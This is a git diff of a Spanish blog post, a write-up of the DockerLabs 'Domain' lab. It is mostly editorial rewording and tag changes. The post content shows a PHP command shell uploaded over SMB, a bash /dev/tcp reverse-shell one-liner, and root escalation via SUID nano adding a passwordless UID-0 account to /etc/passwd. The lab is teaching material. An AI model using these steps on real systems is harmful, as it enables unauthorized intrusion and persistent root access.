@@ -4,11 +4,10 @@ summary: "Write-up del laboratorio Domain de DockerLabs"
 author: elcybercurioso
 date: 2026-01-11
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, smb, brute force, rce, file upload, suid]
 media_subpath: "/assets/img/posts/dockerlabs_domain"
 image:
   path: main.webp
-published: false
 ---
 
 ## nmap
@@ -43,16 +42,15 @@ Host script results:
 
 ## análisis
 
-En la pantalla principal encontramos una breve introducción de que es Samba:
+En la pantalla principal encontramos una breve introducción explicando qué es **Samba**:
 
 ![Desktop View](/20260106173957.webp){: width="972" height="589" .shadow}
 
-Dado que estamos tratando con SMB, vamos a ejecutar un escaneo con **enum4linux** en busca de información útil, donde nos termina revelando los usuarios `james` y `bob`, y varios recursos compartidos a los que no tenemos acceso sin credenciales válidas:
+Dado que estamos tratando con **SMB**, vamos a ejecutar un escaneo con **enum4linux** en busca de información útil, donde nos termina revelando los usuarios `james` y `bob`, y varios recursos compartidos a los que no tenemos acceso sin credenciales válidas:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
-└─$ enum4linux -a 172.17.0.2                         
-Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan  7 11:44:46 2026
+└─$ enum4linux -a 172.17.0.2
 
  =========================================( Target Information )=========================================
 
@@ -156,15 +154,15 @@ Try "help" to get a list of possible commands.
 smb: \> put cmd.php
 putting file cmd.php as \cmd.php (2.6 kB/s) (average 2.6 kB/s)
 smb: \> ls
-  .                                   D        0  XXX XXX  7 XX:XX:XX 2026
+  .                                   D        0  XXX XXX XX XX:XX:XX 2026
   ..                                  D        0  Thu Apr 11 09:18:47 2024
   index.html                          N     1832  Thu Apr 11 09:21:43 2024
-  cmd.php                             A       32  XXX XXX  7 XX:XX:XX 2026
+  cmd.php                             A       32  XXX XXX XX XX:XX:XX 2026
 
                 76798724 blocks of size 1024. 33857552 blocks available
 ```
 
-Si ahora tratamos de acceder a este script desde el navegador, deberíamos poder ejecutar comandos:
+Si ahora tratamos de acceder a este script desde el navegador, veremos que es posible ejecutar comandos:
 
 ```bash
 http://172.17.0.2/cmd.php?cmd=id
@@ -172,7 +170,7 @@ http://172.17.0.2/cmd.php?cmd=id
 
 ![Desktop View](/20260107132119.webp){: width="972" height="589" .shadow}
 
-Procedemos a obtener una reverse shell poniéndonos en escucha en una consola con **nc**, y  ejecutando el siguiente comando (hay que codificar los `&` a `%26` para que no entre en conflicto):
+Procedemos a obtener una reverse shell poniéndonos en escucha por consola con **nc**, y ejecutando el siguiente comando (hay que codificar los `&` a `%26` para que no entre en conflicto):
 
 ```bash
 http://172.17.0.2/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261'
@@ -212,7 +210,7 @@ www-data@e1e8e5aa2a82:/var/www/html$ export SHELL=bash
 www-data@e1e8e5aa2a82:/home$ stty rows 48 columns 210
 ```
 
-En el fichero `/etc/passwd` comprobamos si hay más usuarios que tengan asignada una consola, pero únicamente encontramos los siguientes:
+En el fichero `/etc/passwd` comprobamos si hay más usuarios que tengan asignada una consola, pero únicamente encontramos los que ya hemos descubierto previamente:
 
 ```bash
 www-data@e1e8e5aa2a82:/home$ cat /etc/passwd | grep 'sh$'
@@ -223,7 +221,7 @@ james:x:1001:1001:james,,,:/home/james:/bin/bash
 
 ## movimiento lateral (bob)
 
-Dado que sabemos la contraseña del usuario `bob`, podemos obtener una consola como este usuario:
+Dado que sabemos cual es la contraseña del usuario `bob` por SMB, podemos comprobar si se está reutilizando la contraseña también a nivel de sistema, y vemos que se está haciendo:
 
 ```bash
 www-data@e1e8e5aa2a82:/home$ su bob
@@ -234,7 +232,7 @@ bob
 
 ## escalada de privilegios (root)
 
-Buscamos los binarios cuyos permisos sean SUID (se pueden ejecutar con los permisos del propietario), donde notamos que hay uno que no suele ser común ver (**/usr/bin/nano**):
+Buscamos los binarios cuyos permisos sean **SUID** (se pueden ejecutar con los permisos del propietario), donde notamos que hay uno que no suele ser común ver (**/usr/bin/nano**):
 
 ```bash
 bob@e1e8e5aa2a82:~$ find / -perm -4000 2>/dev/null
@@ -250,7 +248,7 @@ bob@e1e8e5aa2a82:~$ find / -perm -4000 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-Tener permisos SUID sobre editores de texto como `nano` lo que nos permite llegar a modificar cualquier fichero dentro del sistema, ya que el propietario suele ser el usuario `root` o algún otro usuario privilegiado.
+Tener permisos SUID sobre editores de texto como `nano` nos permite modificar cualquier fichero dentro del sistema, ya que el propietario suele ser el usuario `root` o algún otro usuario privilegiado.
 
 Lo que haremos en este caso es modificar el fichero `/etc/passwd` para añadir un nuevo usuario privilegiado:
 
@@ -264,7 +262,7 @@ La siguiente línea es la que debemos indicar en fichero `/etc/passwd`:
 root2::0:0::/root:/bin/bash
 ```
 
-Los valores del campo de nombre, la contraseña, la carpeta personal o la shell asignada pueden variar, pero el **UID** y el **GID** deben ser 0 para que el usuario sea privilegiado (**root**), tal y como se indica en la siguiente [imagen](https://sliceoflinux.wordpress.com/files/2009/03/etc-passwd.png), la cual explica la estructura de los registros del fichero `/etc/passwd`:
+Los valores del campo de **nombre**, la **contraseña**, la **carpeta personal** o la **shell asignada** pueden variar, pero el **UID** y el **GID** deben ser 0 para que el usuario sea privilegiado (**root**), tal y como se indica en la siguiente [imagen](https://sliceoflinux.wordpress.com/files/2009/03/etc-passwd.png), la cual explica la estructura de los registros del fichero `/etc/passwd`:
 
 ![Desktop View](/20260107141330.webp){: width="800" height="520" .shadow}
 
